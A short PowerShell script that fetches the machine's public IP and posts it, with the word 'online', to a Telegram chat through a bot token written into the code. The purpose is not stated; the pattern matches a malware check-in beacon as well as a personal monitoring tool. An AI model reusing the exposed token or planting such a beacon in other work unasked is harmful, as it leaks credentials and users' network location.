$botToken = '6899690141:AAENcDCrG8znTahm-5WB8R7UIZoOPEZTSBQ'
$chatId = '5998953011'
$textMessage = 'online'

# Retrieve public IP using ipify API
$ipifyResponse = Invoke-RestMethod -Uri "http://api.ipify.org?format=json"
$publicIp = $ipifyResponse.ip

# Construct the message with the public IP
$messageWithIp = "$textMessage. Public IP: $publicIp"

# Send the message to Telegram chat
$apiUrl = "https://api.telegram.org/bot$botToken/sendMessage"
$params = @{
    'chat_id'    = $chatId
    'text'       = $messageWithIp
}
$jsonParams = $params | ConvertTo-Json
$response = Invoke-RestMethod -Uri $apiUrl -Method Post -Body $jsonParams -ContentType 'application/json'
Write-Output $response
